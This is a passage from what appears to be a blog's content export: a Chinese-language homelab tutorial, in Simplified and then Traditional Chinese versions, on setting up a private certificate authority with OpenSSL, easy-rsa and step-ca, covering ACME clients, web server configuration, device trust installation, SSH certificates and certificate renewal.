.&#x2F;easyrsa build-ca # 生成服务器证书 .&#x2F;easyrsa gen-req homeserver nopass .&#x2F;easyrsa sign-req server homeserver 方法 3：使用 step-ca（现代化方法 - 推荐） step-ca 是一个现代化的自动化 CA，简化了证书管理。可以把它想象成&quot;家庭实验室的 Let’s Encrypt&quot;。 为什么 step-ca 更好： 自动化证书管理，支持 ACME 协议 内建证书更新 - 无需手动脚本 OAuth/OIDC 集成，用于 SSH 证书 简单的 CLI - 无需复杂的 OpenSSL 命令 网页式工作流程，用于证书请求 默认短期证书（更好的安全性） 远程管理功能 安装： # macOS brew install step # Ubuntu&#x2F;Debian curl -fsSL https:&#x2F;&#x2F;packages.smallstep.com&#x2F;keys&#x2F;apt&#x2F;repo-signing-key.gpg -o &#x2F;etc&#x2F;apt&#x2F;trusted.gpg.d&#x2F;smallstep.asc echo &#39;deb [signed-by&#x3D;&#x2F;etc&#x2F;apt&#x2F;trusted.gpg.d&#x2F;smallstep.asc] https:&#x2F;&#x2F;packages.smallstep.com&#x2F;stable&#x2F;debian debs main&#39; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;smallstep.list sudo apt update &amp;&amp; sudo apt install step-cli step-ca # RHEL&#x2F;Fedora sudo dnf install step-cli step-ca # Windows (Winget) winget install Smallstep.step-ca # Docker docker pull smallstep&#x2F;step-ca 初始化你的 CA： # 交互式设置 step ca init # 系统会提示你输入： # - PKI 名称（例如：&quot;Home Lab&quot;） # - DNS 名称（例如：&quot;ca.homelab.local&quot;） # - 监听地址（例如：&quot;127.0.0.1:8443&quot;） # - 第一个配置者电子邮件（例如：&quot;admin@homelab.local&quot;） # - CA 密钥密码 # 示例输出： ✔ What would you like to name your new PKI? Home Lab ✔ What DNS names or IP addresses would you like to add to your new CA? ca.homelab.local ✔ What address will your new CA listen at? 127.0.0.1:8443 ✔ What would you like to name the first provisioner? admin@homelab.local ✔ What do you want your password to be? ******** ✔ Root certificate: &#x2F;home&#x2F;user&#x2F;.step&#x2F;certs&#x2F;root_ca.crt ✔ Root fingerprint: 702a094e239c9eec6f0dcd0a5f65e595bf7ed6614012825c5fe3d1ae1b2fd6ee 高级初始化选项： # 支持 ACME（用于自动证书管理） step ca init --acme # 支持 SSH 证书 step ca init --ssh # 用于 Kubernetes 部署 step ca init --helm # 启用远程管理 step ca init --remote-management 启动 CA 服务器： # 启动 CA step-ca $(step path)&#x2F;config&#x2F;ca.json # 或作为 systemd 服务运行 sudo systemctl enable step-ca sudo systemctl start step-ca 签发你的第一个证书： # 简单的证书签发 step ca certificate homeserver.local homeserver.crt homeserver.key # 系统会提示你输入配置者密码 ✔ Key ID: rQxROEr7Kx9TNjSQBTETtsu3GKmuW9zm02dMXZ8GUEk ✔ Please enter the password to decrypt the provisioner key: ******** ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;1.0&#x2F;sign ✔ Certificate: homeserver.crt ✔ Private Key: homeserver.key # 使用主体别名（SAN） step ca certificate homeserver.local homeserver.crt homeserver.key \\ --san homeserver \\ --san 192.168.1.100 # 自定义有效期 step ca certificate homeserver.local homeserver.crt homeserver.key \\ --not-after 8760h # 1 年 在客户端机器上信任你的 CA： # 启动信任（下载根 CA 并配置 step） step ca bootstrap --ca-url https:&#x2F;&#x2F;ca.homelab.local:8443 \\ --fingerprint 702a094e239c9eec6f0dcd0a5f65e595bf7ed6614012825c5fe3d1ae1b2fd6ee # 将根 CA 安装到系统信任存储区 step certificate install $(step path)&#x2F;certs&#x2F;root_ca.crt 自动证书更新： step-ca 让更新变得简单： # 更新证书（到期前） step ca renew homeserver.crt homeserver.key ✔ Would you like to overwrite homeserver.crt [y&#x2F;n]: y Your certificate has been saved in homeserver.crt. # 自动更新守护进程（在证书生命周期的 2&#x2F;3 时更新） step ca renew homeserver.crt homeserver.key --daemon # 强制更新 step ca renew homeserver.crt homeserver.key --force ⏰ 更新时机证书一旦过期，CA 将不会更新它。设置自动更新在证书生命周期的三分之二左右执行。--daemon 标志会自动处理这个问题。 调整证书有效期： # 5 分钟证书（用于敏感访问） step ca certificate localhost localhost.crt localhost.key --not-after&#x3D;5m # 90 天证书（用于服务器） step ca certificate homeserver.local homeserver.crt homeserver.key --not-after&#x3D;2160h # 从现在起 5 分钟后开始有效的证书 step ca certificate localhost localhost.crt localhost.key --not-before&#x3D;5m --not-after&#x3D;240h 要更改全局默认值，编辑 $(step path)/config/ca.json： &quot;authority&quot;: &#123; &quot;claims&quot;: &#123; &quot;minTLSCertDuration&quot;: &quot;5m&quot;, &quot;maxTLSCertDuration&quot;: &quot;2160h&quot;, &quot;defaultTLSCertDuration&quot;: &quot;24h&quot; &#125; &#125; 高级：单次使用令牌（用于容器/虚拟机）： 生成短期令牌用于委派证书签发： # 生成令牌（5 分钟后过期） TOKEN&#x3D;$(step ca token homeserver.local) ✔ Provisioner: admin@homelab.local (JWK) ✔ Please enter the password to decrypt the provisioner key: ******** # 在容器&#x2F;虚拟机中：建立 CSR step certificate create --csr homeserver.local homeserver.csr homeserver.key # 在容器&#x2F;虚拟机中：使用令牌获取证书 step ca sign --token $TOKEN homeserver.csr homeserver.crt ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 ✔ Certificate: homeserver.crt 这非常适合： 启动时需要证书的 Docker 容器 虚拟机配置工作流程 CI/CD 管道 在不共享 CA 凭证的情况下委派证书签发 ACME 集成（类似 Let’s Encrypt）： ACME（自动化证书管理环境）是 Let’s Encrypt 使用的协议。step-ca 支持 ACME，实现完全自动化的证书签发和更新。 启用 ACME： # 添加 ACME 配置者（如果初始化时未完成） step ca provisioner add acme --type ACME # 重新启动 step-ca 以应用更改 sudo systemctl restart step-ca ACME 挑战类型： 挑战 端口 使用场景 难度 http-01 80 通用目的、网页服务器 简单 dns-01 53 通配符证书、防火墙后的服务器 中等 tls-alpn-01 443 仅 TLS 环境 中等 使用 step 作为 ACME 客户端： # HTTP-01 挑战（在端口 80 启动网页服务器） step ca certificate --provisioner acme example.com example.crt example.key ✔ Provisioner: acme (ACME) Using Standalone Mode HTTP challenge to validate example.com .. done! Waiting for Order to be &#39;ready&#39; for finalization .. done! Finalizing Order .. done! ✔ Certificate: example.crt ✔ Private Key: example.key 使用 certbot： # HTTP-01 挑战 certbot certonly --standalone \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local \\ --register-unsafely-without-email # DNS-01 挑战（用于通配符证书） certbot certonly --manual --preferred-challenges dns \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d &#39;*.homelab.local&#39; # 自动更新 certbot renew --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory 使用 acme.sh： # HTTP-01 挑战 acme.sh --issue --standalone \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local # 使用 Cloudflare 的 DNS-01 export CF_Token&#x3D;&quot;your-cloudflare-api-token&quot; acme.sh --issue --dns dns_cf \\ --server https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory \\ -d homeserver.local # 自动更新（每日运行） acme.sh --cron ACME 流程图： sequenceDiagram participant Client as ACME 客户端 participant CA as step-ca participant Web as 网页服务器 Client->>CA: 1. 建立账户并订购证书 CA->>Client: 2. 返回挑战（http-01、dns-01、tls-alpn-01） Client->>Web: 3. 在 /.well-known/acme-challenge/ 放置挑战响应 Client->>CA: 4. 准备验证 CA->>Web: 5. 验证挑战响应 CA->>Client: 6. 挑战已验证 Client->>CA: 7. 提交 CSR CA->>Client: 8. 签发证书 Note over Client,CA: 证书自动签发！ 为什么 ACME 更好： 零人工干预 - 完全自动化的证书生命周期 自动更新 - 不会有过期的证书 行业标准 - 适用于任何 ACME 客户端 大规模验证 - 支持 Let’s Encrypt（数十亿证书） 内建验证 - 自动证明域名/IP 所有权 与 Traefik 集成： # traefik.yml entryPoints: websecure: address: &quot;:443&quot; certificatesResolvers: homelab: acme: caServer: https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;acme&#x2F;acme&#x2F;directory storage: &#x2F;acme.json tlsChallenge: &#123;&#125; # docker-compose.yml services: whoami: image: traefik&#x2F;whoami labels: - &quot;traefik.http.routers.whoami.rule&#x3D;Host(&#96;whoami.homelab.local&#96;)&quot; - &quot;traefik.http.routers.whoami.tls.certresolver&#x3D;homelab&quot; Docker Compose 配置： version: &#39;3&#39; services: step-ca: image: smallstep&#x2F;step-ca ports: - &quot;8443:8443&quot; volumes: - step-ca-data:&#x2F;home&#x2F;step environment: - DOCKER_STEPCA_INIT_NAME&#x3D;Home Lab - DOCKER_STEPCA_INIT_DNS_NAMES&#x3D;ca.homelab.local - DOCKER_STEPCA_INIT_PROVISIONER_NAME&#x3D;admin@homelab.local restart: unless-stopped volumes: step-ca-data: 比较：OpenSSL vs step-ca 任务 OpenSSL step-ca 建立 CA 多个命令、配置文件 step ca init 签发证书 5+ 个命令加配置 step ca certificate 更新 手动脚本 step ca renew --daemon ACME 支持 未内建 内建 学习曲线 陡峭 平缓 自动化 DIY 内建 SSH 证书 复杂 step ssh 命令 💡 何时使用 step-ca如果你符合以下情况，请使用 step-ca： 想要自动化证书管理 需要 ACME 协议支持 想与现代工具集成（Traefik、Kubernetes） 偏好简单的 CLI 而非复杂的 OpenSSL 命令 需要 SSH 证书管理 想要内建的更新自动化 如果你符合以下情况，请坚持使用 OpenSSL： 需要对每个细节的最大控制 有现有的基于 OpenSSL 的工作流程 在无法获取 step-ca 二进制文件的隔离环境中工作 需要 step-ca 不支持的特定证书扩展功能 安装你的 CA 证书 Windows 双击 root-ca.crt 点击&quot;安装证书&quot; 选择&quot;本地计算机&quot; 选择&quot;将所有证书放入以下存储&quot; 选择&quot;受信任的根证书颁发机构&quot; 点击&quot;完成&quot; macOS sudo security add-trusted-cert -d -r trustRoot -k &#x2F;Library&#x2F;Keychains&#x2F;System.keychain root-ca.crt Linux (Ubuntu/Debian) sudo cp root-ca.crt &#x2F;usr&#x2F;local&#x2F;share&#x2F;ca-certificates&#x2F;homelab-root-ca.crt sudo update-ca-certificates iOS/iPadOS 将 root-ca.crt 发送给自己或放在网页服务器上 在设备上打开文件 前往&quot;设置&quot;→&quot;通用&quot;→&quot;VPN 与设备管理&quot; 安装描述文件 前往&quot;设置&quot;→&quot;通用&quot;→&quot;关于本机&quot;→&quot;证书信任设置&quot; 为该证书启用完全信任 Android 将 root-ca.crt 复制到设备 “设置&quot;→&quot;安全&quot;→&quot;加密与凭据&quot;→&quot;安装证书” 选择&quot;CA 证书&quot; 浏览并选择你的证书 配置服务 Nginx server &#123; listen 443 ssl; server_name homeserver.local; ssl_certificate &#x2F;path&#x2F;to&#x2F;homeserver.crt; ssl_certificate_key &#x2F;path&#x2F;to&#x2F;homeserver.key; # 可选：包含中继 CA # ssl_certificate 应包含：服务器证书 + 中继证书 ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:8080; &#125; &#125; Apache &lt;VirtualHost *:443&gt; ServerName homeserver.local SSLEngine on SSLCertificateFile &#x2F;path&#x2F;to&#x2F;homeserver.crt SSLCertificateKeyFile &#x2F;path&#x2F;to&#x2F;homeserver.key SSLCertificateChainFile &#x2F;path&#x2F;to&#x2F;intermediate-ca.crt ProxyPass &#x2F; http:&#x2F;&#x2F;localhost:8080&#x2F; ProxyPassReverse &#x2F; http:&#x2F;&#x2F;localhost:8080&#x2F; &lt;&#x2F;VirtualHost&gt; Docker Compose version: &#39;3&#39; services: web: image: nginx:alpine ports: - &quot;443:443&quot; volumes: - .&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf - .&#x2F;homeserver.crt:&#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;cert.crt - .&#x2F;homeserver.key:&#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;cert.key 证书管理 证书生命周期 flowchart TD A[\"📝 建立证书\"] --> B[\"🚀 部署到服务器\"] B --> C[\"👁️ 监控到期日\"] C --> D{\"⏰ 即将到期？\"} D -->|\"否\"| C D -->|\"是（生命周期的 2/3）\"| E[\"🔄 更新证书\"] E --> F[\"🚀 重新部署到服务器\"] F --> C style A fill:#e3f2fd style B fill:#e8f5e9 style C fill:#fff3e0 style D fill:#fff9c4 style E fill:#f3e5f5 style F fill:#e8f5e9 更新脚本 #!&#x2F;bin&#x2F;bash # renew-cert.sh DOMAIN&#x3D;&quot;homeserver.local&quot; CERT_DIR&#x3D;&quot;&#x2F;etc&#x2F;ssl&#x2F;homelab&quot; # 生成新的密钥和 CSR openssl genrsa -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.key 2048 openssl req -new -key $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.key \\ -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.csr \\ -subj &quot;&#x2F;CN&#x3D;$&#123;DOMAIN&#125;&quot; # 使用中继 CA 签署 openssl x509 -req -in $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.csr \\ -CA $&#123;CERT_DIR&#125;&#x2F;intermediate-ca.crt \\ -CAkey $&#123;CERT_DIR&#125;&#x2F;intermediate-ca.key \\ -CAcreateserial -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.crt \\ -days 365 -sha256 # 重新加载 nginx systemctl reload nginx echo &quot;Certificate renewed for $&#123;DOMAIN&#125;&quot; 使用 Cron 自动化 # 添加到 crontab：在到期前 30 天更新 0 0 1 * * &#x2F;path&#x2F;to&#x2F;renew-cert.sh 安全最佳实践 ⚠️ 关键安全措施保护你的根 CA 私钥： 存储在加密的 USB 闪存盘上并离线保存 绝不暴露于网络 使用强密码（AES-256） 保留多个加密备份 生产环境考虑使用硬件安全模块（HSM） 关键安全措施： 分离根 CA 和中继 CA 根 CA：离线，仅用于签署中继 CA 中继 CA：在线，签署服务器证书 使用强密钥大小 根 CA：4096 位 RSA 或 EC P-384 中继 CA：4096 位 RSA 或 EC P-384 服务器证书：最少 2048 位 RSA 设置适当的有效期 根 CA：10-20 年 中继 CA：5 年 服务器证书：1 年（更容易轮换） 实施证书撤销 维护证书撤销列表（CRL） 或使用在线证书状态协议（OCSP） 审计和监控 记录所有证书签发 监控未授权的证书 定期安全审计 常见问题与解决方案 问题：浏览器仍显示警告 原因： CA 证书未正确安装 证书未包含正确的 SAN（主体别名） 通过 IP 访问但证书只有 DNS 名称 解决方案： # 检查证书 SAN openssl x509 -in homeserver.crt -text -noout | grep -A1 &quot;Subject Alternative Name&quot; # 确保证书包含所有访问方式 DNS.1 &#x3D; homeserver.local DNS.2 &#x3D; homeserver IP.1 &#x3D; 192.168.1.100 问题：证书链不完整 解决方案： 建立证书组合： cat homeserver.crt intermediate-ca.crt &gt; homeserver-bundle.crt 在服务器配置中使用组合文件。 问题：私钥权限 # 设置正确的权限 chmod 600 homeserver.key chown root:root homeserver.key 高级：自动化证书管理 使用 step-ca 的 SSH 证书 如果你使用 --ssh 初始化，step-ca 也可以签发 SSH 证书以实现无密码验证。 设置 SSH 用户验证： # 在 SSH 服务器上：信任用户 CA step ssh config --roots &gt; &#x2F;etc&#x2F;ssh&#x2F;ssh_user_ca.pub echo &#39;TrustedUserCAKeys &#x2F;etc&#x2F;ssh&#x2F;ssh_user_ca.pub&#39; | sudo tee -a &#x2F;etc&#x2F;ssh&#x2F;sshd_config sudo systemctl restart sshd # 在客户端：获取 SSH 用户证书 step ssh certificate alice@homelab.local id_ecdsa ✔ Provisioner: admin@homelab.local (JWK) ✔ Please enter the password to decrypt the provisioner key: ******** ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 ✔ Private Key: id_ecdsa ✔ Certificate: id_ecdsa-cert.pub ✔ SSH Agent: yes # 检查证书 cat id_ecdsa-cert.pub | step ssh inspect 设置 SSH 主机验证： # 在 SSH 服务器上：获取主机证书 cd &#x2F;etc&#x2F;ssh sudo step ssh certificate --host --sign server.homelab.local ssh_host_ecdsa_key.pub # 配置 SSHD 使用证书 echo &#39;HostCertificate &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key-cert.pub&#39; | sudo tee -a &#x2F;etc&#x2F;ssh&#x2F;sshd_config sudo systemctl restart sshd # 在客户端：信任主机 CA step ssh config --host --roots &gt;&gt; ~&#x2F;.ssh&#x2F;known_hosts # 前面加上：@cert-authority * 自动化 SSH 主机证书更新： # 建立每周更新 cron cat &lt;&lt;EOF | sudo tee &#x2F;etc&#x2F;cron.weekly&#x2F;renew-ssh-cert #!&#x2F;bin&#x2F;sh export STEPPATH&#x3D;&#x2F;root&#x2F;.step cd &#x2F;etc&#x2F;ssh &amp;&amp; step ssh renew ssh_host_ecdsa_key-cert.pub ssh_host_ecdsa_key --force exit 0 EOF sudo chmod 755 &#x2F;etc&#x2F;cron.weekly&#x2F;renew-ssh-cert 使用 step-ca 与 nginx-proxy-manager # 1. 从 step-ca 获取证书 step ca certificate npm.homelab.local npm.crt npm.key # 2. 在 nginx-proxy-manager UI 中： # - SSL 证书 → 添加 SSL 证书 → 自定义 # - 上传 npm.crt 和 npm.key # - 使用 step ca renew --daemon 设置自动更新 使用 step-ca 与 Home Assistant # configuration.yaml http: ssl_certificate: &#x2F;ssl&#x2F;homeassistant.crt ssl_key: &#x2F;ssl&#x2F;homeassistant.key # 获取证书 # step ca certificate homeassistant.local &#x2F;ssl&#x2F;homeassistant.crt &#x2F;ssl&#x2F;homeassistant.key 监控和管理 # 检查证书到期日 step certificate inspect homeserver.crt --short X.509v3 TLS Certificate (ECDSA P-256) [Serial: 7720...1576] Subject: homeserver.local Issuer: Home Lab Intermediate CA Valid from: 2025-05-15T00:59:37Z to: 2025-05-16T01:00:37Z # 撤销证书（被动撤销 - 阻止更新） step ca revoke --cert homeserver.crt --key homeserver.key ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 Certificate with Serial Number 30671613121311574910895916201205874495 has been revoked. # 列出配置者 step ca provisioner list 比较：私有 CA vs Let’s Encrypt 功能 私有 CA Let’s Encrypt 成本 免费 免费 内部 IP ✅ 是 ❌ 否 .local 域名 ✅ 是 ❌ 否 离线运作 ✅ 是 ❌ 否 自动更新 手动/自定义 ✅ 内建 公开信任 ❌ 否 ✅ 是 设置复杂度 中等 低 维护 手动 自动化 何时使用私有 CA： 仅限内部服务 私有 IP 地址 .local 或自定义 TLD 隔离网络 需要完全控制 何时使用 Let’s Encrypt： 公开服务 公开域名 想要自动更新 不想管理 CA 基础设施 资源 OpenSSL 文档： 完整的 OpenSSL 参考 easy-rsa： 简化的 CA 管理 step-ca： 支持 ACME 的现代化 CA PKI 教程： 全面的 PKI 指南 结论 建立私有 CA 一开始可能看起来令人生畏，但一旦配置完成，它就能消除那些烦人的浏览器警告，并为你的家庭实验室服务提供适当的加密。初期的时间投资会带来更专业、更安全的家庭网络。 重点摘要： 私有 CA 为内部服务启用受信任的 HTTPS 推荐使用 step-ca 进行现代化的自动证书管理 两层架构（根 + 中继）提供更好的安全性 在所有设备上安装一次根 CA 证书 自动化证书更新以避免到期问题（step-ca 让这变得简单） 保持根 CA 私钥离线并确保安全 SSH 证书消除密码验证并提高安全性 快速入门建议： 对于大多数家庭实验室，使用 step-ca： step ca init --acme --ssh（一个命令设置） step certificate install $(step path)/certs/root_ca.crt（在所有设备上信任） step ca certificate service.local service.crt service.key（获取证书） step ca renew service.crt service.key --daemon（自动更新） 从单一服务开始，熟悉流程后，再扩展到整个家庭实验室。当你不再需要点击安全警告时，未来的你会感谢现在的自己！🔒","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"},{"name":"Homelab","slug":"Homelab","permalink":"https://neo01.com/tags/Homelab/"},{"name":"PKI","slug":"PKI","permalink":"https://neo01.com/tags/PKI/"}],"lang":"zh-CN"},{"title":"在家中建立私有憑證授權中心","slug":"2024/03/Private-CA-at-Home-zh-TW","date":"un55fin55","updated":"un00fin00","comments":false,"path":"/zh-TW/2024/03/Private-CA-at-Home/","permalink":"https://neo01.com/zh-TW/2024/03/Private-CA-at-Home/","excerpt":"厭倦了家庭實驗室服務的瀏覽器警告？學習如何建立自己的憑證授權中心，為內部服務簽發受信任的 SSL 憑證。","text":"你已經建立了一個漂亮的家庭實驗室，包含多個服務——Nextcloud、Home Assistant、Plex，也許還有 NAS。一切運作良好，除了一件煩人的事：每次透過 HTTPS 存取這些服務時，瀏覽器都會大喊「你的連線不是私人連線！」 當然，你可以每次都點擊「進階」和「繼續前往」。但如果我告訴你有更好的方法呢？歡迎來到私有憑證授權中心的世界。 為什麼需要私有 CA 問題所在： 當你存取 https://192.168.1.100 或 https://homeserver.local 時，瀏覽器不信任該連線，因為： 自簽憑證預設不受信任 公開 CA（Let’s Encrypt、DigiCert）不會為私有 IP 位址或 .local 網域簽發憑證 每次點擊略過安全警告會失去 HTTPS 的意義 解決方案： 建立你自己的憑證授權中心（CA），它可以： 為你的內部服務簽發憑證 安裝後被你所有裝置信任 離線運作，無需外部依賴 讓你完全控制憑證生命週期 理解基礎概念 什麼是憑證授權中心？ CA 是簽發數位憑證的實體。當你的瀏覽器信任某個 CA 時，它會自動信任該 CA 簽署的任何憑證。 信任鏈： flowchart TD A[\"🏛️ 根 CA(你的私有 CA)\"] --> B[\"📜 中繼 CA(選用)\"] B --> C[\"🔒 伺服器憑證(homeserver.local)\"] B --> D[\"🔒 伺服器憑證(nas.local)\"] B --> E[\"🔒 伺服器憑證(192.168.1.100)\"] F[\"💻 你的裝置\"] -.->|\"信任\"| A F -->|\"自動信任\"| C F -->|\"自動信任\"| D F -->|\"自動信任\"| E style A fill:#e3f2fd style B fill:#f3e5f5 style C fill:#e8f5e9 style D fill:#e8f5e9 style E fill:#e8f5e9 style F fill:#fff3e0 根 CA vs 中繼 CA 根 CA： 最高層級的授權中心。保持離線並確保安全。 中繼 CA： 簽署實際憑證。可以撤銷而不影響根 CA。 伺服器憑證： 你的服務用於 HTTPS 的憑證。 💡 最佳實務使用兩層架構：根 CA → 中繼 CA → 伺服器憑證。這樣，如果中繼 CA 被入侵，你可以撤銷它而無需在所有裝置上重新信任根 CA。 建立你的私有 CA 方法 1：使用 OpenSSL（手動控制） 步驟 1：建立根 CA # 產生根 CA 私鑰（務必妥善保管！） openssl genrsa -aes256 -out root-ca.key 4096 # 建立根 CA 憑證（有效期 10 年） openssl req -x509 -new -nodes -key root-ca.key -sha256 -days 3650 \\ -out root-ca.crt \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;Home Lab Root CA&quot; 步驟 2：建立中繼 CA # 產生中繼 CA 私鑰 openssl genrsa -aes256 -out intermediate-ca.key 4096 # 建立憑證簽署請求（CSR） openssl req -new -key intermediate-ca.key -out intermediate-ca.csr \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;Home Lab Intermediate CA&quot; # 使用根 CA 簽署中繼 CA openssl x509 -req -in intermediate-ca.csr -CA root-ca.crt -CAkey root-ca.key \\ -CAcreateserial -out intermediate-ca.crt -days 1825 -sha256 \\ -extfile &lt;(echo &quot;basicConstraints&#x3D;CA:TRUE&quot;) 步驟 3：簽發伺服器憑證 # 產生伺服器私鑰 openssl genrsa -out homeserver.key 2048 # 為伺服器建立 CSR openssl req -new -key homeserver.key -out homeserver.csr \\ -subj &quot;&#x2F;C&#x3D;US&#x2F;ST&#x3D;State&#x2F;L&#x3D;City&#x2F;O&#x3D;Home Lab&#x2F;CN&#x3D;homeserver.local&quot; # 建立 SAN（主體別名）設定 cat &gt; san.cnf &lt;&lt;EOF [req] distinguished_name &#x3D; req_distinguished_name req_extensions &#x3D; v3_req [req_distinguished_name] [v3_req] subjectAltName &#x3D; @alt_names [alt_names] DNS.1 &#x3D; homeserver.local DNS.2 &#x3D; homeserver IP.1 &#x3D; 192.168.1.100 EOF # 使用中繼 CA 簽署伺服器憑證 openssl x509 -req -in homeserver.csr -CA intermediate-ca.crt \\ -CAkey intermediate-ca.key -CAcreateserial -out homeserver.crt \\ -days 365 -sha256 -extfile san.cnf -extensions v3_req 方法 2：使用 easy-rsa（簡化版） # 安裝 easy-rsa git clone https:&#x2F;&#x2F;github.com&#x2F;OpenVPN&#x2F;easy-rsa.git cd easy-rsa&#x2F;easyrsa3 # 初始化 PKI .&#x2F;easyrsa init-pki # 建立 CA .&#x2F;easyrsa build-ca # 產生伺服器憑證 .&#x2F;easyrsa gen-req homeserver nopass .&#x2F;easyrsa sign-req server homeserver 方法 3：使用 step-ca（現代化方法 - 推薦） step-ca 是一個現代化的自動化 CA，簡化了憑證管理。可以把它想像成「家庭實驗室的 Let’s Encrypt」。 為什麼 step-ca 更好： 自動化憑證管理，支援 ACME 協定 內建憑證更新 - 無需手動腳本 OAuth/OIDC 整合，用於 SSH 憑證 簡單的 CLI - 無需複雜的 OpenSSL 指令 網頁式工作流程，用於憑證請求 預設短期憑證（更好的安全性） 遠端管理功能 安裝： # macOS brew install step # Ubuntu&#x2F;Debian curl -fsSL https:&#x2F;&#x2F;packages.smallstep.com&#x2F;keys&#x2F;apt&#x2F;repo-signing-key.gpg -o &#x2F;etc&#x2F;apt&#x2F;trusted.gpg.d&#x2F;smallstep.asc echo &#39;deb [signed-by&#x3D;&#x2F;etc&#x2F;apt&#x2F;trusted.gpg.d&#x2F;smallstep.asc] https:&#x2F;&#x2F;packages.smallstep.com&#x2F;stable&#x2F;debian debs main&#39; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;smallstep.list sudo apt update &amp;&amp; sudo apt install step-cli step-ca # RHEL&#x2F;Fedora sudo dnf install step-cli step-ca # Windows (Winget) winget install Smallstep.step-ca # Docker docker pull smallstep&#x2F;step-ca 初始化你的 CA： # 互動式設定 step ca init # 系統會提示你輸入： # - PKI 名稱（例如：「Home Lab」） # - DNS 名稱（例如：「ca.homelab.local」） # - 監聽位址（例如：「127.0.0.1:8443」） # - 第一個佈建者電子郵件（例如：「admin@homelab.local」） # - CA 金鑰密碼 # 範例輸出： ✔ What would you like to name your new PKI? Home Lab ✔ What DNS names or IP addresses would you like to add to your new CA? ca.homelab.local ✔ What address will your new CA listen at? 127.0.0.1:8443 ✔ What would you like to name the first provisioner? admin@homelab.local ✔ What do you want your password to be? ******** ✔ Root certificate: &#x2F;home&#x2F;user&#x2F;.step&#x2F;certs&#x2F;root_ca.crt ✔ Root fingerprint: 702a094e239c9eec6f0dcd0a5f65e595bf7ed6614012825c5fe3d1ae1b2fd6ee 進階初始化選項： # 支援 ACME（用於自動憑證管理） step ca init --acme # 支援 SSH 憑證 step ca init --ssh # 用於 Kubernetes 部署 step ca init --helm # 啟用遠端管理 step ca init --remote-management 啟動 CA 伺服器： # 啟動 CA step-ca $(step path)&#x2F;config&#x2F;ca.json # 或作為 systemd 服務執行 sudo systemctl enable step-ca sudo systemctl start step-ca 簽發你的第一個憑證： # 簡單的憑證簽發 step ca certificate homeserver.local homeserver.crt homeserver.key # 系統會提示你輸入佈建者密碼 ✔ Key ID: rQxROEr7Kx9TNjSQBTETtsu3GKmuW9zm02dMXZ8GUEk ✔ Please enter the password to decrypt the provisioner key: ******** ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443&#x2F;1.0&#x2F;sign ✔ Certificate: homeserver.crt ✔ Private Key: homeserver.key # 使用主體別名（SAN） step ca certificate homeserver.local homeserver.crt homeserver.key \\ --san homeserver \\ --san 192.168.1.100 # 自訂有效期 step ca certificate homeserver.local homeserver.crt homeserver.key \\ --not-after 8760h # 1 年 在客戶端機器上信任你的 CA： # 啟動信任（下載根 CA 並設定 step） step ca bootstrap --ca-url https:&#x2F;&#x2F;ca.homelab.local:8443 \\ --fingerprint 702a094e239c9eec6f0dcd0a5f65e595bf7ed6614012825c5fe3d1ae1b2fd6ee # 將根 CA 安裝到系統信任儲存區 step certificate install $(step path)&#x2F;certs&#x2F;root_ca.crt 自動憑證更新： step-ca 讓更新變得簡單： # 更新憑證（到期前） step ca renew homeserver.crt homeserver.key ✔ Would you like to overwrite homeserver.crt [y&#x2F;n]: y Your certificate has been saved in homeserver.crt. # 自動更新守護程序（在憑證生命週期的 2&#x2F;3 時更新） step ca renew homeserver.crt homeserver.key --daemon # 強制更新 step ca renew homeserver.crt homeserver.key --force ⏰ 更新時機憑證一旦過期，CA 將不會更新它。設定自動更新在憑證生命週期的三分之二左右執行。--daemon 旗標會自動處理這個問題。 調整憑證有效期： # 5 分鐘憑證（用於敏感存取） step ca certificate localhost localhost.crt localhost.key --not-after&#x3D;5m # 90 天憑證（用於伺服器） step ca certificate homeserver.local homeserver.crt homeserver.key --not-after&#x3D;2160h # 從現在起 5 分鐘後開始有效的憑證 step ca certificate localhost localhost.crt localhost.key --not-before&#x3D;5m --not-after&#x3D;240h 要變更全域預設值，編輯 $(step path)/config/ca.json： &quot;authority&quot;: &#123; &quot;claims&quot;: &#123; &quot;minTLSCertDuration&quot;: &quot;5m&quot;, &quot;maxTLSCertDuration&quot;: &quot;2160h&quot;, &quot;defaultTLSCertDuration&quot;: &quot;24h&quot; &#125; &#125; 進階：單次使用權杖（用於容器/虛擬機）： 產生短期權杖用於委派憑證簽發： 